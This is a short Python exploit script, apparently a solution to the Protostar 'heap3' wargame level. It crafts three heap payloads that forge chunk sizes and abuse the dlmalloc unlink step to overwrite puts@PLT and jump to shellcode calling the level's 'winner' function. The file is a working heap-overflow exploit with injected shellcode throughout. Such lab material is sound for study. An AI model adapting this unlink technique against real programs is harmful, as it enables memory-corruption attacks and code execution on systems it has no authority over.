# coding: utf-8

import os
import struct

def write_pay(filename, payload):
        file = open(filename, "wb")
        file.write(payload)
        file.close()

PUTS_PLT = 0x804b128 # puts@PLT
HEAP_ADDR = 0x804c000 # Address where the heap starts (where it's loaded to)
TARGET_ADDR = 0x8048864 # winner
# Chunk 2
payload2 = "B"*36 # Offset bfore hitting the 3rd chunk size
payload2 += "\x65" # new size of 3rd chunk
# Chunk 3
payload3 = "C"*92
payload3 += struct.pack("I", 0xfffffffc) # => 0
payload3 += struct.pack("I", 0xfffffffc) # => 0
payload3 += struct.pack("I", PUTS_PLT-12) # puts@plt - 12
print(hex(PUTS_PLT - 12))
payload3 += struct.pack("I", HEAP_ADDR+0x14) # heap + 0x14 <- Code execution will be redirected here
print(hex(HEAP_ADDR+0x14))
# Chunk 1
shellcode = "\xB8\x64\x88\x04\x08\xFF\xD0" # mov eax, <winner> ; call eax
payload1 = "A"*12
payload1 += shellcode

write_pay("pay1", payload1)
write_pay("pay2", payload2)
write_pay("pay3", payload3)

os.system("/opt/protostar/bin/heap3 "+payload1+" "+payload2+" "+payload3)
